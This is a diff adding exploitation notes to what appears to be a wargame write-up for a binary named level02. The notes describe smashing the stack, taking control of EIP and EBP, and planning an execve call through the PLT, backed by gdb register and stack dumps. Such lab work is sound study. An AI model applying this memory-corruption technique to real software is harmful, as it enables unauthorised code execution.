@@ -273,5 +273,61 @@ Executable Sections:
 Because there is no overlap between writable and executable sections, will need to set EBP to bss region then call execve from the plt
 
 
+At this point the stack is smashed, we have control over eip and ebp, now need to make sure that esp is set up properly such that we can write a few bytes to
+to a known offset in memory.  
+
+(gdb) ni 
+0x08049915 in encrypt_file () at level02/level02.c:62
+62	in level02/level02.c
+
+(gdb) i r
+eax            0x51	81
+ecx            0xbf98ea2b	-1080497621
+edx            0x1	1
+ebx            0xb76d2ff4	-1217581068
+esp            0xbf9aea3c	0xbf9aea3c
+ebp            0xbffd0000	0xbffd0000
+esi            0x0	0
+edi            0x0	0
+eip            0x8049915	0x8049915 <encrypt_file+286>
+eflags         0x246	[ PF ZF IF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/40wx $esp
+0xbf9aea3c:	0x08049818	0x11111111	0x22222222	0x080489b0
+0xbf9aea4c:	0x080489b0	0x10000001	0x140804b5	0x000804b5
+0xbf9aea5c:	0x1c000000	0x08049960	0x00000000	0x00000000
+0xbf9aea6c:	0xb7574113	0x00000001	0xbf9aeb04	0xbf9aeb0c
+0xbf9aea7c:	0xb7702ff4	0xb7703918	0x00000001	0x00000000
+0xbf9aea8c:	0xb76f1bfb	0xb7703ad0	0xb76d2ff4	0x00000000
+0xbf9aea9c:	0x00000000	0x00000000	0x89ac16b3	0x12f952a2
+0xbf9aeaac:	0x00000000	0x00000000	0x00000000	0x00000001
+0xbf9aeabc:	0x08048a90	0x00000000	0xb76f7c30	0xb7574029
+0xbf9aeacc:	0xb7702ff4	0x00000001	0x08048a90	0x00000000
+
+
+
+buffer location 
+(gdb) i r
+eax            0x804b509	134526217      <-------  make sure appropriately spaced
+ecx            0xbf98ea2b	-1080497621
+edx            0x1	1
+ebx            0xb76d2ff4	-1217581068
+esp            0xbf9aea40	0xbf9aea40
+ebp            0x806b51d	0x806b51d
+esi            0x0	0
+edi            0x0	0
+eip            0x8049861	0x8049861 <encrypt_file+106>
+eflags         0x246	[ PF ZF IF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
 
 
